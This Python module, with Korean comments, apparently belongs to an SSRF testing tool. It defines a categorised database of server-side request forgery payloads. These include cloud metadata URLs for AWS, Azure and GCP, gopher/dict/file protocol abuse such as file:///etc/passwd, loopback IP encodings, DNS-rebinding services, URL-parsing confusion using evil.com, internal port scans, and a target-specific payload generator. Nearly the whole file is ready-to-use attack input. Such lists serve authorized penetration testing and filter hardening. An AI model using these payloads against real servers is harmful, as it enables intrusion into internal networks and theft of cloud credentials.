"""
SSRF 페이로드 데이터베이스 - 연구 기반 우회 기법 포함
"""

import itertools
from typing import List, Dict, Any


class SSRFPayloadDatabase:
    """PortSwigger 연구 기반 SSRF 페이로드 데이터베이스"""

    def __init__(self):
        self.payload_categories = {
            'basic_internal': self._get_basic_internal_payloads(),
            'ip_encoding': self._get_ip_encoding_payloads(),
            'dns_bypass': self._get_dns_bypass_payloads(),
            'protocol_abuse': self._get_protocol_abuse_payloads(),
            'cloud_metadata': self._get_cloud_metadata_payloads(),
            'localhost_variants': self._get_localhost_variants(),
            'port_scanning': self._get_port_scanning_payloads(),
            'url_parsing_bypass': self._get_url_parsing_bypass(),
            'unicode_bypass': self._get_unicode_bypass(),
            'dns_rebinding': self._get_dns_rebinding_payloads(),
            'ipv6_bypass': self._get_ipv6_bypass_payloads(),
            'encoding_bypass': self._get_encoding_bypass_payloads(),
            'parsing_confusion': self._get_parsing_confusion_payloads()
        }

    def _get_basic_internal_payloads(self) -> List[Dict[str, Any]]:
        """기본 내부 네트워크 페이로드"""
        return [
            {
                'payload': 'http://127.0.0.1/',
                'description': 'Basic localhost',
                'category': 'localhost',
                'risk_level': 'medium'
            },
            {
                'payload': 'http://localhost/',
                'description': 'Localhost domain',
                'category': 'localhost',
                'risk_level': 'medium'
            },
            {
                'payload': 'http://0.0.0.0/',
                'description': 'All interfaces',
                'category': 'localhost',
                'risk_level': 'medium'
            },
            {
                'payload': 'http://192.168.1.1/',
                'description': 'Private network gateway',
                'category': 'private_network',
                'risk_level': 'high'
            },
            {
                'payload': 'http://10.0.0.1/',
                'description': 'Private network Class A',
                'category': 'private_network',
                'risk_level': 'high'
            },
            {
                'payload': 'http://172.16.0.1/',
                'description': 'Private network Class B',
                'category': 'private_network',
                'risk_level': 'high'
            }
        ]

    def _get_ip_encoding_payloads(self) -> List[Dict[str, Any]]:
        """IP 인코딩 우회 기법 (PortSwigger 연구)"""
        payloads = []

        # 127.0.0.1 다양한 인코딩
        encodings = [
            ('2130706433', 'decimal'),        # 10진수
            ('017700000001', 'octal'),        # 8진수
            ('0x7f000001', 'hex'),            # 16진수
            ('0177.0.0.1', 'mixed_octal'),    # 혼합 8진수
            ('127.1', 'short_form'),          # 축약형
            ('127.0.1', 'short_form2'),       # 축약형2
        ]

        for encoded_ip, encoding_type in encodings:
            payloads.append({
                'payload': f'http://{encoded_ip}/',
                'description': f'127.0.0.1 {encoding_type} encoding',
                'category': 'ip_encoding',
                'risk_level': 'high',
                'encoding_type': encoding_type
            })

        return payloads

    def _get_dns_bypass_payloads(self) -> List[Dict[str, Any]]:
        """DNS 우회 기법"""
        dns_services = [
            'nip.io', 'xip.io', 'sslip.io',
            'localtest.me', 'lvh.me'
        ]

        payloads = []
        for service in dns_services:
            payloads.extend([
                {
                    'payload': f'http://127.0.0.1.{service}/',
                    'description': f'DNS wildcard service: {service}',
                    'category': 'dns_bypass',
                    'risk_level': 'high',
                    'service': service
                },
                {
                    'payload': f'http://localhost.{service}/',
                    'description': f'Localhost via {service}',
                    'category': 'dns_bypass',
                    'risk_level': 'medium',
                    'service': service
                }
            ])

        # 자체 도메인 (실제 환경에서는 교체)
        payloads.append({
            'payload': 'http://ssrf-test.local/',
            'description': 'Custom controlled domain',
            'category': 'dns_bypass',
            'risk_level': 'critical',
            'requires_setup': True
        })

        return payloads

    def _get_protocol_abuse_payloads(self) -> List[Dict[str, Any]]:
        """프로토콜 변조 공격"""
        return [
            {
                'payload': 'gopher://127.0.0.1:80/_GET / HTTP/1.1%0A%0A',
                'description': 'Gopher protocol HTTP request',
                'category': 'protocol_abuse',
                'risk_level': 'critical',
                'protocol': 'gopher'
            },
            {
                'payload': 'dict://127.0.0.1:11211/stat',
                'description': 'Dict protocol memcached',
                'category': 'protocol_abuse',
                'risk_level': 'high',
                'protocol': 'dict'
            },
            {
                'payload': 'ftp://127.0.0.1/',
                'description': 'FTP protocol access',
                'category': 'protocol_abuse',
                'risk_level': 'medium',
                'protocol': 'ftp'
            },
            {
                'payload': 'ldap://127.0.0.1:389/',
                'description': 'LDAP protocol access',
                'category': 'protocol_abuse',
                'risk_level': 'high',
                'protocol': 'ldap'
            },
            {
                'payload': 'file:///etc/passwd',
                'description': 'Local file inclusion',
                'category': 'protocol_abuse',
                'risk_level': 'critical',
                'protocol': 'file'
            }
        ]

    def _get_cloud_metadata_payloads(self) -> List[Dict[str, Any]]:
        """클라우드 메타데이터 서비스"""
        return [
            {
                'payload': 'http://169.254.169.254/latest/meta-data/',
                'description': 'AWS EC2 metadata',
                'category': 'cloud_metadata',
                'risk_level': 'critical',
                'provider': 'aws'
            },
            {
                'payload': 'http://169.254.169.254/metadata/instance?api-version=2019-11-01',
                'description': 'Azure metadata',
                'category': 'cloud_metadata',
                'risk_level': 'critical',
                'provider': 'azure'
            },
            {
                'payload': 'http://metadata.google.internal/',
                'description': 'Google Cloud metadata',
                'category': 'cloud_metadata',
                'risk_level': 'critical',
                'provider': 'gcp'
            },
            {
                'payload': 'http://169.254.169.254/latest/user-data/',
                'description': 'AWS user data',
                'category': 'cloud_metadata',
                'risk_level': 'critical',
                'provider': 'aws'
            }
        ]

    def _get_localhost_variants(self) -> List[Dict[str, Any]]:
        """localhost 변형"""
        variants = [
            'localhost', 'LOCALHOST', 'LocalHost',
            '127.0.0.1', '127.1', '127.00.00.01',
            'localhost.localdomain', 'localhost.localdomain.localdomain'
        ]

        payloads = []
        for variant in variants:
            payloads.append({
                'payload': f'http://{variant}/',
                'description': f'Localhost variant: {variant}',
                'category': 'localhost_variants',
                'risk_level': 'medium'
            })

        return payloads

    def _get_port_scanning_payloads(self) -> List[Dict[str, Any]]:
        """내부 포트 스캔"""
        common_ports = [22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 27017]

        payloads = []
        for port in common_ports:
            payloads.append({
                'payload': f'http://127.0.0.1:{port}/',
                'description': f'Internal port scan: {port}',
                'category': 'port_scanning',
                'risk_level': 'high',
                'port': port
            })

        return payloads

    def _get_url_parsing_bypass(self) -> List[Dict[str, Any]]:
        """URL 파싱 혼동 공격"""
        return [
            {
                'payload': 'http://evil.com@127.0.0.1/',
                'description': 'Username confusion attack',
                'category': 'url_parsing',
                'risk_level': 'high'
            },
            {
                'payload': 'http://127.0.0.1#@evil.com/',
                'description': 'Fragment confusion',
                'category': 'url_parsing',
                'risk_level': 'medium'
            },
            {
                'payload': 'http://127.0.0.1%00.evil.com/',
                'description': 'Null byte injection',
                'category': 'url_parsing',
                'risk_level': 'high'
            },
            {
                'payload': 'http://127.0.0.1%2e%2e%2f',
                'description': 'Path traversal in domain',
                'category': 'url_parsing',
                'risk_level': 'medium'
            }
        ]

    def _get_unicode_bypass(self) -> List[Dict[str, Any]]:
        """유니코드 우회"""
        return [
            {
                'payload': 'http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/',
                'description': 'Unicode localhost (circled)',
                'category': 'unicode_bypass',
                'risk_level': 'medium'
            },
            {
                'payload': 'http://𝐍𝐨𝐜𝐚𝐍𝐡𝐨𝐬𝐭/',
                'description': 'Unicode localhost (bold)',
                'category': 'unicode_bypass',
                'risk_level': 'medium'
            },
            {
                'payload': 'http://127。０。０。１/',
                'description': 'Unicode dots',
                'category': 'unicode_bypass',
                'risk_level': 'high'
            }
        ]

    def _get_dns_rebinding_payloads(self) -> List[Dict[str, Any]]:
        """DNS 리바인딩 우회 기법 (PayloadsAllTheThings 기반)"""
        return [
            {
                'payload': 'http://make-1.2.3.4-rebind-127.0.0.1-rr.1u.ms/',
                'description': 'DNS rebinding service 1u.ms',
                'category': 'dns_rebinding',
                'risk_level': 'critical',
                'technique': 'dns_rebinding'
            },
            {
                'payload': 'http://make-192.168.1.1-rebind-127.0.0.1-rr.1u.ms/',
                'description': 'DNS rebinding to localhost from private IP',
                'category': 'dns_rebinding',
                'risk_level': 'critical',
                'technique': 'dns_rebinding'
            },
            {
                'payload': 'http://localtest.me/',
                'description': 'localtest.me always resolves to 127.0.0.1',
                'category': 'dns_rebinding',
                'risk_level': 'high',
                'technique': 'domain_redirect'
            },
            {
                'payload': 'http://localh.st/',
                'description': 'localh.st alternative redirect service',
                'category': 'dns_rebinding',
                'risk_level': 'high',
                'technique': 'domain_redirect'
            },
            {
                'payload': 'http://company.127.0.0.1.nip.io/',
                'description': 'nip.io wildcard DNS service',
                'category': 'dns_rebinding',
                'risk_level': 'critical',
                'technique': 'nip_io'
            }
        ]

    def _get_ipv6_bypass_payloads(self) -> List[Dict[str, Any]]:
        """IPv6 표기법 우회 기법"""
        return [
            {
                'payload': 'http://[::]:80/',
                'description': 'IPv6 unspecified address',
                'category': 'ipv6_bypass',
                'risk_level': 'high',
                'technique': 'ipv6_notation'
            },
            {
                'payload': 'http://[0000::1]:80/',
                'description': 'IPv6 loopback address',
                'category': 'ipv6_bypass',
                'risk_level': 'high',
                'technique': 'ipv6_notation'
            },
            {
                'payload': 'http://[0:0:0:0:0:ffff:127.0.0.1]/',
                'description': 'IPv6 mapped IPv4 address (full)',
                'category': 'ipv6_bypass',
                'risk_level': 'critical',
                'technique': 'ipv6_mapped'
            },
            {
                'payload': 'http://[::ffff:127.0.0.1]/',
                'description': 'IPv6 mapped IPv4 address (short)',
                'category': 'ipv6_bypass',
                'risk_level': 'critical',
                'technique': 'ipv6_mapped'
            },
            {
                'payload': 'http://[::ffff:7f00:1]/',
                'description': 'IPv6 mapped with hex notation',
                'category': 'ipv6_bypass',
                'risk_level': 'high',
                'technique': 'ipv6_hex'
            }
        ]

    def _get_encoding_bypass_payloads(self) -> List[Dict[str, Any]]:
        """고급 인코딩 우회 기법"""
        return [
            {
                'payload': 'http://127.0.0.1/%61dmin',
                'description': 'Single URL encoding bypass',
                'category': 'encoding_bypass',
                'risk_level': 'medium',
                'technique': 'single_url_encoding'
            },
            {
                'payload': 'http://127.0.0.1/%2561dmin',
                'description': 'Double URL encoding bypass',
                'category': 'encoding_bypass',
                'risk_level': 'high',
                'technique': 'double_url_encoding'
            },
            {
                'payload': 'http://127.0.0.1/%252561dmin',
                'description': 'Triple URL encoding bypass',
                'category': 'encoding_bypass',
                'risk_level': 'high',
                'technique': 'triple_url_encoding'
            },
            {
                'payload': 'http://127.0.0.1/%%32%65%%32%65%%32%66',
                'description': 'Mixed encoding traversal',
                'category': 'encoding_bypass',
                'risk_level': 'critical',
                'technique': 'mixed_encoding'
            },
            {
                'payload': 'http://127.0.0.1/%00%00%00%61%00%00%00d%00%00%00m%00%00%00i%00%00%00n',
                'description': 'UTF-32 encoding with null bytes',
                'category': 'encoding_bypass',
                'risk_level': 'critical',
                'technique': 'utf32_encoding'
            }
        ]

    def _get_parsing_confusion_payloads(self) -> List[Dict[str, Any]]:
        """URL 파싱 불일치 공격"""
        return [
            {
                'payload': 'http://127.1.1.1:80\\@127.2.2.2:80/',
                'description': 'Backslash @ confusion',
                'category': 'parsing_confusion',
                'risk_level': 'critical',
                'technique': 'backslash_at'
            },
            {
                'payload': 'http://127.1.1.1:80\\@@127.2.2.2:80/',
                'description': 'Double @ confusion',
                'category': 'parsing_confusion',
                'risk_level': 'critical',
                'technique': 'double_at'
            },
            {
                'payload': 'http://127.1.1.1:80:\\@@127.2.2.2:80/',
                'description': 'Colon backslash @ confusion',
                'category': 'parsing_confusion',
                'risk_level': 'critical',
                'technique': 'colon_backslash_at'
            },
            {
                'payload': 'http://127.1.1.1:80#\\@127.2.2.2:80/',
                'description': 'Fragment confusion',
                'category': 'parsing_confusion',
                'risk_level': 'high',
                'technique': 'fragment_confusion'
            },
            {
                'payload': 'http://example.com@127.0.0.1/',
                'description': 'Username @ localhost',
                'category': 'parsing_confusion',
                'risk_level': 'critical',
                'technique': 'username_at'
            },
            {
                'payload': 'http://127.0.0.1#@example.com/',
                'description': 'Fragment @ confusion',
                'category': 'parsing_confusion',
                'risk_level': 'medium',
                'technique': 'fragment_at'
            }
        ]

    def get_payloads_by_category(self, category: str) -> List[Dict[str, Any]]:
        """카테고리별 페이로드 반환"""
        return self.payload_categories.get(category, [])

    def get_payloads_by_risk(self, risk_level: str) -> List[Dict[str, Any]]:
        """위험도별 페이로드 반환"""
        all_payloads = []
        for category_payloads in self.payload_categories.values():
            all_payloads.extend(category_payloads)

        return [p for p in all_payloads if p['risk_level'] == risk_level]

    def get_all_payloads(self) -> List[Dict[str, Any]]:
        """모든 페이로드 반환"""
        all_payloads = []
        for category_payloads in self.payload_categories.values():
            all_payloads.extend(category_payloads)

        return all_payloads

    def generate_custom_payloads(self, target_ip: str, target_port: int = None) -> List[Dict[str, Any]]:
        """타겟별 커스텀 페이로드 생성"""
        custom_payloads = []

        # 기본 HTTP
        base_url = f"http://{target_ip}"
        if target_port:
            base_url = f"http://{target_ip}:{target_port}"

        custom_payloads.append({
            'payload': f'{base_url}/',
            'description': f'Direct access to {target_ip}',
            'category': 'custom',
            'risk_level': 'high'
        })

        # IP 인코딩 변형
        if target_ip == '127.0.0.1':
            ip_parts = target_ip.split('.')
            # 10진수 변환
            decimal_ip = sum(int(part) * (256 ** (3-i)) for i, part in enumerate(ip_parts))
            custom_payloads.append({
                'payload': f'http://{decimal_ip}/',
                'description': f'Decimal encoding of {target_ip}',
                'category': 'custom',
                'risk_level': 'high'
            })

        return custom_payloads

    def get_payload_statistics(self) -> Dict[str, int]:
        """페이로드 통계"""
        stats = {}
        all_payloads = self.get_all_payloads()

        stats['total'] = len(all_payloads)

        # 카테고리별 통계
        for category in self.payload_categories:
            stats[f'category_{category}'] = len(self.payload_categories[category])

        # 위험도별 통계
        for risk in ['critical', 'high', 'medium', 'low']:
            stats[f'risk_{risk}'] = len(self.get_payloads_by_risk(risk))

        return stats


def main():
    """테스트 실행"""
    db = SSRFPayloadDatabase()

    print("=== SSRF 페이로드 데이터베이스 ===")
    stats = db.get_payload_statistics()
    print(f"총 페이로드: {stats['total']}개")

    print("\n카테고리별:")
    for category in db.payload_categories:
        count = stats[f'category_{category}']
        print(f"  {category}: {count}개")

    print("\n위험도별:")
    for risk in ['critical', 'high', 'medium', 'low']:
        count = stats[f'risk_{risk}']
        print(f"  {risk}: {count}개")

    # 고위험 페이로드 샘플 출력
    print("\n고위험 페이로드 샘플:")
    high_risk = db.get_payloads_by_risk('critical')[:5]
    for i, payload in enumerate(high_risk, 1):
        print(f"  {i}. {payload['payload']}")
        print(f"     {payload['description']}")


if __name__ == "__main__":
    main()
